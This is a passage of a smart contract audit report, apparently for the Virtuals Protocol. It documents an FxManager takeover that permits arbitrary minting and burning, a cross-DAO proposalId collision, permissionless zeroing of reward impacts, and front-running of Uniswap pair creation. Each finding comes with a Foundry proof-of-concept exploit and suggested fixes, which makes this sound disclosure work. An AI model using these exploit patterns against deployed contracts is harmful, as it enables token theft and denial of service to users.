    address attacker = address(0xBEEF);
    address victim = address(0xCAFE);

    function test_FxManagerTakeover_AllowsArbitraryMintAndBurn() public {
        // Deploy with some arbitrary initial manager
        BMWTokenChild child = new BMWTokenChild(address(0x1234));

        // Attacker takes over manager role
        vm.prank(attacker);
        child.setFxManager(attacker);

        // Attacker mints unlimited tokens to self
        vm.prank(attacker);
        child.mint(attacker, 1_000_000 ether);
        assertEq(child.balanceOf(attacker), 1_000_000 ether, "attacker freely minted");

        // Attacker mints tokens to an arbitrary recipient without consent
        vm.prank(attacker);
        child.mint(victim, 10 ether);
        assertEq(child.balanceOf(victim), 10 ether, "arbitrary user received tokens without consent");

        // Attacker burns victim funds (destructive control)
        vm.prank(attacker);
        child.burn(victim, 6 ether);
        assertEq(child.balanceOf(victim), 4 ether, "attacker burned victim tokens");
    }
}


## Suggested Mitigation
Restrict manager updates with proper access control and make the manager immutable or owned. Example fix:

- Add Ownable and guard the setter:

contract BMWTokenChild is ERC20, Ownable {
    address internal _fxManager;
    constructor(address fxManager) ERC20("BeemerToken", "BMW") Ownable(msg.sender) {
        _fxManager = fxManager;
    }
    function setFxManager(address fxManager) public onlyOwner {
        require(fxManager != address(0), "zero address");
        _fxManager = fxManager;
    }
    function mint(address user, uint256 amount) public {
        require(msg.sender == _fxManager, "only manager");
        _mint(user, amount);
    }
    function burn(address user, uint256 amount) public {
        require(msg.sender == _fxManager, "only manager");
        _burn(user, amount);
    }
}

Alternatively, remove setFxManager entirely after construction (make _fxManager immutable) if role rotation is not required.



# Medium Risk Findings

## [M-1]. DOS issue in ContributionNft::mint

## Description
Cross-DAO proposalId collision lets an attacker front-run and permanently block legitimate Contribution NFT minting for another DAO's proposal. Root cause: tokenId is set equal to proposalId globally without namespacing by virtualId, and there is no binding that the provided proposalId belongs to the provided virtualId's DAO. Vulnerable code (contracts/contribution/ContributionNft.sol#L53-L88 approx):

function mint(
    address to,
    uint256 virtualId,
    uint8 coreId,
    string memory newTokenURI,
    uint256 proposalId,
    uint256 parentId,
    bool isModel_,
    uint256 datasetId
) external returns (uint256) {
    IGovernor personaDAO = getAgentDAO(virtualId);
    require(
        msg.sender == personaDAO.proposalProposer(proposalId),
        "Only proposal proposer can mint Contribution NFT"
    );
    require(parentId != proposalId, "Cannot be parent of itself");

    _mint(to, proposalId); // tokenId = proposalId (GLOBAL), no virtualId namespace
    _setTokenURI(proposalId, newTokenURI);
    _contributionVirtualId[proposalId] = virtualId; // binds proposalId to passed virtualId
    ...
}

Because OpenZeppelin's Governor proposalIds are pure hashes of proposal parameters (not bound to a specific DAO address), two different DAOs can have identical proposalIds if the proposals share parameters. An attacker can create the same proposal in a DAO they control (or any DAO where they can propose), then mint first with that shared proposalId under their virtualId. This globally occupies the ERC721 tokenId and prevents the real proposer in the original DAO from ever minting their NFT.

## Impact
Permanent denial-of-service for legitimate Contribution NFT minting: an attacker can mint the NFT for a proposalId that belongs to another DAO (with the same proposalId) before the legitimate proposer, making the real mint revert due to ERC721 token already minted. This also corrupts system state by associating the proposalId with the wrong virtualId, causing isAccepted() to query the wrong DAO and potentially breaking downstream reward/accounting flows. Requires admin intervention or contract migration to recover.

## Proof of Concept
1) Victim DAO A has a proposal with id P created by Alice (legitimate proposer).
2) Attacker creates an identical proposal in DAO B (or any DAO they can propose in), which yields the same proposalId P (Governor hashes are not namespaced by DAO address).
3) Attacker calls ContributionNft.mint with virtualId = B and proposalId = P. Check passes because in DAO B, proposalProposer(P) == attacker.
4) The NFT with tokenId = P is now minted and bound to virtualId B.
5) When Alice (the real proposer in DAO A) tries to mint using virtualId = A and proposalId = P, _mint(to, P) reverts because tokenId P is already minted. The legitimate mint is permanently blocked.
6) Additionally, any isAccepted(P) calls will check state(P) on DAO B instead of DAO A due to _contributionVirtualId[P] = B, further corrupting logic.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ContributionNft} from "contracts/contribution/ContributionNft.sol";

interface IAgentNftMock {
    struct VirtualInfo { address dao; }
    function virtualInfo(uint256) external view returns (VirtualInfo memory);
}

contract MockAgentNft is IAgentNftMock {
    mapping(uint256 => address) public daos;
    function setDao(uint256 id, address dao) external { daos[id] = dao; }
    function virtualInfo(uint256 id) external view returns (VirtualInfo memory info) { info.dao = daos[id]; }
}

contract MockGovernor {
    enum ProposalState { Pending, Active, Canceled, Defeated, Succeeded, Queued, Expired, Executed }
    mapping(uint256 => address) public proposers;
    function setProposer(uint256 pid, address proposer) external { proposers[pid] = proposer; }
    function proposalProposer(uint256 pid) external view returns (address) { return proposers[pid]; }
    function state(uint256) external pure returns (ProposalState) { return ProposalState.Active; }
}

contract ContributionNft_DoS_Collision_Test is Test {
    ContributionNft nft;
    MockAgentNft persona;
    MockGovernor daoA;
    MockGovernor daoB;

    address attacker = address(0xA11CE);
    address alice    = address(0xB0B);

    uint256 constant VIRTUAL_A = 1;
    uint256 constant VIRTUAL_B = 2;
    uint256 constant PROPOSAL_ID = 123456789; // same id across two DAOs

    function setUp() public {
        persona = new MockAgentNft();
        nft = new ContributionNft();
        nft.initialize(address(persona));

        daoA = new MockGovernor();
        daoB = new MockGovernor();

        persona.setDao(VIRTUAL_A, address(daoA));
        persona.setDao(VIRTUAL_B, address(daoB));

        // Same proposalId P exists in both DAOs but with different proposers
        daoA.setProposer(PROPOSAL_ID, alice);
        daoB.setProposer(PROPOSAL_ID, attacker);
    }

    function test_CrossDaoProposalIdCollision_BlocksLegitimateMint() public {
        // Attacker mints first using DAO B with the shared proposalId
        vm.prank(attacker);
        nft.mint(attacker, VIRTUAL_B, 0, "uri-B", PROPOSAL_ID, 0, false, 0);

        // Verify attacker owns the globally unique tokenId (proposalId)
        assertEq(nft.ownerOf(PROPOSAL_ID), attacker);
        assertEq(nft.tokenVirtualId(PROPOSAL_ID), VIRTUAL_B);

        // Legitimate proposer from DAO A is now permanently blocked
        vm.prank(alice);
        vm.expectRevert();
        nft.mint(alice, VIRTUAL_A, 0, "uri-A", PROPOSAL_ID, 0, false, 0);
    }
}


## Suggested Mitigation
Namespace tokenIds by virtualId to prevent cross-DAO collisions and bind the minted NFT to its DAO unambiguously. For example, derive a unique tokenId from both virtualId and proposalId:

- Replace direct use of `proposalId` as the ERC721 tokenId with a composite id:

  uint256 tokenId = uint256(keccak256(abi.encodePacked(virtualId, proposalId)));
  _mint(to, tokenId);
  _contributionVirtualId[tokenId] = virtualId;
  // Optionally store original proposalId in a separate mapping if needed

- Additionally, consider validating that the provided proposalId truly exists in the chosen DAO (if the DAO exposes such a check) or adjust the minting flow to take the full proposal signature (targets, values, calldatas, descriptionHash) and recompute the expected proposalId on-chain for that DAO before minting.

Example patch:

function mint(
    address to,
    uint256 virtualId,
    uint8 coreId,
    string memory newTokenURI,
    uint256 proposalId,
    uint256 parentId,
    bool isModel_,
    uint256 datasetId
) external returns (uint256) {
    IGovernor personaDAO = getAgentDAO(virtualId);
    require(msg.sender == personaDAO.proposalProposer(proposalId), "Only proposal proposer can mint Contribution NFT");
    require(parentId != proposalId, "Cannot be parent of itself");

    uint256 tokenId = uint256(keccak256(abi.encode(virtualId, proposalId)));
    _mint(to, tokenId);
    _setTokenURI(tokenId, newTokenURI);
    _contributionVirtualId[tokenId] = virtualId;
    _parents[tokenId] = parentId;
    _children[parentId].push(tokenId);
    _cores[tokenId] = coreId;
    if (isModel_) { modelContributions[tokenId] = true; modelDatasets[tokenId] = datasetId; }
    emit NewContribution(tokenId, virtualId, parentId, datasetId);
    return tokenId;
}


## [M-2]. Access Control issue in ServiceNft::updateImpact

## Description
Public, permissionless recalculation allows anyone to zero out impacts for the latest core service. In ServiceNft.updateImpact, there is no access control and the function rewrites critical accounting (_impacts and _maturities). After a successful mint of a model service, _coreServices[virtualId][_cores[proposalId]] is set to proposalId. Any subsequent public call to updateImpact(virtualId, proposalId) will set prevServiceId == proposalId, making rawImpact = 0 and overwriting both the model and its dataset impacts to zero. This breaks reward accounting used by the Minter and causes model/dataset owners to receive 0 rewards for that epoch.

Vulnerable snippet (2025-04-virtuals-protocol/contracts/contribution/ServiceNft.sol#L56-L106):

function updateImpact(uint256 virtualId, uint256 proposalId) public {
    uint256 prevServiceId = _coreServices[virtualId][_cores[proposalId]];
    uint256 rawImpact = (_maturities[proposalId] > _maturities[prevServiceId])
        ? _maturities[proposalId] - _maturities[prevServiceId]
        : 0;
    uint256 datasetId = IContributionNft(contributionNft).getDatasetId(proposalId);

    _impacts[proposalId] = rawImpact;
    if (datasetId > 0) {
        _impacts[datasetId] = (rawImpact * datasetImpactWeight) / 10000;
        _impacts[proposalId] = rawImpact - _impacts[datasetId];
        emit SetServiceScore(datasetId, _maturities[proposalId], _impacts[datasetId]);
        _maturities[datasetId] = _maturities[proposalId];
    }

    emit SetServiceScore(proposalId, _maturities[proposalId], _impacts[proposalId]);
}

And in mint (2025-04-virtuals-protocol/contracts/contribution/ServiceNft.sol#L31-L55), the sequence is:
- updateImpact(virtualId, proposalId);
- _coreServices[virtualId][_cores[proposalId]] = proposalId;

Thus, after mint completes, any caller can re-call updateImpact and force rawImpact to 0 due to prevServiceId == proposalId, zeroing impacts.

## Impact
Anyone can set the latest model and its dataset impacts to 0 for a given virtualId/core immediately after mint, causing reward distortion. Minter relies on ServiceNft.getImpact(); resetting to 0 results in model/dataset owners receiving zero tokens for that period. This is a permissionless economic DoS requiring admin intervention or new model issuance to restore impacts.

## Proof of Concept
1) A DAO mints a model ServiceNft (mint), which internally computes a positive impact and then sets _coreServices[virtualId][core] = proposalId.
2) After mint, an attacker (any EOA) calls updateImpact(virtualId, proposalId).
3) prevServiceId equals proposalId, therefore rawImpact becomes 0. The function overwrites _impacts[proposalId] and (if applicable) _impacts[datasetId] to 0.
4) Subsequent reward calculations that pull from ServiceNft.getImpact(proposalId) see 0, depriving rightful recipients.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ServiceNft} from "contracts/contribution/ServiceNft.sol";

interface IAgentDAO {
    function getMaturity(uint256 proposalId) external view returns (uint256);
}

contract MockAgentDAO is IAgentDAO {
    // Also mimics IGovernor.hashProposal
    function hashProposal(address[] memory targets, uint256[] memory values, bytes[] memory calldatas, bytes32 descHash) external pure returns (uint256) {
        return uint256(keccak256(abi.encode(targets, values, calldatas, descHash)));
    }
    function getMaturity(uint256) external pure returns (uint256) {
        return 100; // constant maturity for test
    }
}

interface IAgentNft {
    struct VirtualInfo { address dao; address tba; }
    function virtualInfo(uint256 virtualId) external view returns (VirtualInfo memory);
}

contract MockAgentNft is IAgentNft {
    struct Info { address dao; address tba; }
    mapping(uint256 => Info) public infos;
    function setVirtualInfo(uint256 id, address dao, address tba) external { infos[id] = Info(dao, tba); }
    function virtualInfo(uint256 virtualId) external view returns (VirtualInfo memory) {
        Info memory i = infos[virtualId];
        return VirtualInfo({dao: i.dao, tba: i.tba});
    }
}

interface IContributionNft {
    function getCore(uint256 tokenId) external view returns (uint8);
    function isModel(uint256 tokenId) external view returns (bool);
    function getDatasetId(uint256 tokenId) external view returns (uint256);
    function tokenURI(uint256 tokenId) external view returns (string memory);
}

contract MockContributionNft is IContributionNft {
    uint8 public core = 1;
    bool public model = true;
    uint256 public datasetId = 777;
    function set(uint8 c, bool m, uint256 d) external { core = c; model = m; datasetId = d; }
    function getCore(uint256) external view returns (uint8) { return core; }
    function isModel(uint256) external view returns (bool) { return model; }
    function getDatasetId(uint256) external view returns (uint256) { return datasetId; }
    function tokenURI(uint256) external pure returns (string memory) { return "mock"; }
}

contract ServiceNft_UpdateImpact_Public_Zeroing_Test is Test {
    ServiceNft svc;
    MockAgentNft agentNft;
    MockContributionNft contrib;
    MockAgentDAO dao;

    address attacker = address(0xA11CE);
    uint256 virtualId = 1;

    function setUp() public {
        svc = new ServiceNft();
        svc.initialize(address(agentNft = new MockAgentNft()), address(contrib = new MockContributionNft()), 5000);
        dao = new MockAgentDAO();
        // Set DAO and TBA for the virtual
        agentNft.setVirtualInfo(virtualId, address(dao), address(0xBEEF));
    }

    function test_PublicUpdateImpact_AllowsZeroingImpacts() public {
        bytes32 descHash = keccak256("desc");

        vm.prank(address(dao));
        uint256 proposalId = svc.mint(virtualId, descHash);

        // After mint, impact should be > 0
        uint256 impactBefore = svc.getImpact(proposalId);
        assertGt(impactBefore, 0, "impact should be initialized > 0 after mint");

        // Anyone can call updateImpact and zero out the impact due to prevServiceId == proposalId
        vm.prank(attacker);
        svc.updateImpact(virtualId, proposalId);

        uint256 impactAfter = svc.getImpact(proposalId);
        assertEq(impactAfter, 0, "impact should be zeroed by unprivileged caller");
    }
}


## Suggested Mitigation
Restrict updateImpact so it cannot be called permissionlessly post-mint or make it a no-op when prevServiceId == proposalId.

Options:
- Make updateImpact internal and only invoke during mint; add an owner/governance-only recalculation function if needed.
- Or gate it to the Virtual DAO (info.dao) only, or to contract owner.
- Or early return when prevServiceId == proposalId to prevent zeroing.

Example fix:

function updateImpact(uint256 virtualId, uint256 proposalId) public {
    // Only allow trusted recalculation
    require(msg.sender == owner(), "not authorized"); // or require(msg.sender == info.dao)

    uint256 prevServiceId = _coreServices[virtualId][_cores[proposalId]];
    // Prevent zeroing when called after setting current as latest
    if (prevServiceId == proposalId) {
        return; // no state mutation
    }

    uint256 rawImpact = (_maturities[proposalId] > _maturities[prevServiceId])
        ? _maturities[proposalId] - _maturities[prevServiceId]
        : 0;
    uint256 datasetId = IContributionNft(contributionNft).getDatasetId(proposalId);

    _impacts[proposalId] = rawImpact;
    if (datasetId > 0) {
        uint256 datasetImpact = (rawImpact * datasetImpactWeight) / 10000;
        _impacts[datasetId] = datasetImpact;
        _impacts[proposalId] = rawImpact - datasetImpact;
        emit SetServiceScore(datasetId, _maturities[proposalId], _impacts[datasetId]);
        _maturities[datasetId] = _maturities[proposalId];
    }

    emit SetServiceScore(proposalId, _maturities[proposalId], _impacts[proposalId]);
}


## [M-3]. DOS issue in AgentFactoryV4::_createPair

## Description
Denial-of-Service via pair pre-creation in custom-token execution flow. AgentFactoryV4 unconditionally requires that the UniswapV2 pair does not exist before creating it, making execution of custom-token applications permanently revertible by any third party who pre-creates the pair.

Vulnerable snippet: contracts/virtualPersona/AgentFactoryV4.sol#_createPair

require(factory.getPair(tokenAddr, assetToken) == address(0), "pool already exists");
uniswapV2Pair_ = factory.createPair(tokenAddr, assetToken);

This path is invoked from _executeApplication when handling custom tokens (initFromToken): contracts/virtualPersona/AgentFactoryV4.sol#_executeApplication

// Custom token
lp = _createPair(token);
IERC20(token).forceApprove(_uniswapRouter, type(uint256).max);
IERC20(assetToken).forceApprove(_uniswapRouter, initialAmount);
IUniswapV2Router02(_uniswapRouter).addLiquidity(...);

Because IUniswapV2Factory.createPair is permissionless, anyone can call it before the proposer executes, causing _createPair to revert and permanently DoS executeTokenApplication.

## Impact
Any unprivileged attacker can permanently block execution of all custom-token applications for a given token by pre-creating the pair (token, assetToken) on the configured factory. This prevents proposers from ever executing their applications (executeTokenApplication reverts), requiring privileged intervention (e.g., changing router/factory) to recover. The DoS impacts core protocol functionality and blocks users’ funds from progressing to the intended state.

## Proof of Concept
1) Proposer submits a custom-token application via initFromToken(), transferring initialLP of the custom token and applicationThreshold of assetToken to AgentFactoryV4.
2) Before the proposer executes, an attacker calls factory.createPair(customToken, assetToken) directly on the same UniswapV2Factory used by AgentFactoryV4.
3) Proposer calls executeTokenApplication(id, canStake). _executeApplication() reaches _createPair(customToken), which checks require(factory.getPair(...) == address(0)), but now getPair != 0x0, so it reverts with "pool already exists".
4) The application cannot be executed anymore; users are stuck until an admin changes configuration or deploys a new factory.

## Proof of Code
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "contracts/virtualPersona/AgentFactoryV4.sol";
import "contracts/dev/BMWToken.sol";

contract FakeFactory {
    mapping(address => mapping(address => address)) public pair;
    function getPair(address a, address b) external view returns (address) {
        return pair[a][b];
    }
    function createPair(address a, address b) external returns (address) {
        require(pair[a][b] == address(0), "already");
        address p = address(uint160(uint256(keccak256(abi.encodePacked(a, b, block.timestamp)))));
        pair[a][b] = p;
        pair[b][a] = p;
        return p;
    }
}

contract FakeRouter {
    address public _factory;
    constructor(address f) { _factory = f; }
    function factory() external view returns (address) { return _factory; }
}

contract AgentFactoryV4_DOSTest is Test {
    AgentFactoryV4 factory;
    BMWToken asset;
    BMWToken custom;
    FakeFactory uniFactory;
    FakeRouter router;

    address proposer = address(0xBEEF);
    address attacker = address(0xABCD);

    function setUp() public {
        // Deploy tokens
        asset = new BMWToken(address(this));
        custom = new BMWToken(address(this));

        // Mint balances to proposer
        asset.mint(proposer, 1_000_000 ether);
        custom.mint(proposer, 1_000_000 ether);

        // Deploy fake router/factory
        uniFactory = new FakeFactory();
        router = new FakeRouter(address(uniFactory));

        // Deploy AgentFactoryV4 and initialize
        factory = new AgentFactoryV4();
        factory.initialize(
            address(0x1111),              // tokenImplementation (unused in this test path)
            address(0x2222),              // veTokenImplementation
            address(0x3333),              // daoImplementation
            address(0x4444),              // tbaRegistry
            address(asset),               // assetToken
            address(0x5555),              // nft
            1 ether,                      // applicationThreshold
            address(0x6666),              // vault
            0                             // nextId
        );
        // Set router and token admin (admin is the test contract by initialize())
        factory.setUniswapRouter(address(router));
        factory.setTokenAdmin(address(this));
    }

    function test_DoS_by_PrecreatingPair() public {
        // Proposer prepares allowances
        vm.startPrank(proposer);
        asset.approve(address(factory), type(uint256).max);
        custom.approve(address(factory), type(uint256).max);

        // Create custom-token application
        uint8[] memory cores = new uint8[](1);
        cores[0] = 1;
        uint256 initialLP = 1000 ether;
        uint256 id = factory.initFromToken(
            address(custom),
            cores,
            bytes32(0),
            address(0x7777),
            7 days,
            1000,            // daoThreshold (dummy)
            initialLP
        );
        vm.stopPrank();

        // Attacker griefs by pre-creating the pair on the same factory
        vm.prank(attacker);
        uniFactory.createPair(address(custom), address(asset));

        // Proposer attempts to execute; will revert due to pre-created pair
        vm.expectRevert(bytes("pool already exists"));
        vm.prank(proposer);
        factory.executeTokenApplication(id, true);
    }
}


## Suggested Mitigation
Allow using an existing pair instead of reverting. If a pair already exists on the configured factory, reuse it. Only create a pair when none exists.

Suggested fix:

function _createPair(address tokenAddr) internal returns (address uniswapV2Pair_) {
    IUniswapV2Factory factory = IUniswapV2Factory(IUniswapV2Router02(_uniswapRouter).factory());
    address existing = factory.getPair(tokenAddr, assetToken);
    if (existing == address(0)) {
        uniswapV2Pair_ = factory.createPair(tokenAddr, assetToken);
    } else {
        uniswapV2Pair_ = existing; // reuse existing pair instead of reverting
    }
    return uniswapV2Pair_;
}

Alternatively, if creating the pair yourself is required for invariants, store and use a factory that cannot be front-run, or deploy the pair deterministically (CREATE2) within your own factory contract to prevent third-party pre-creation.



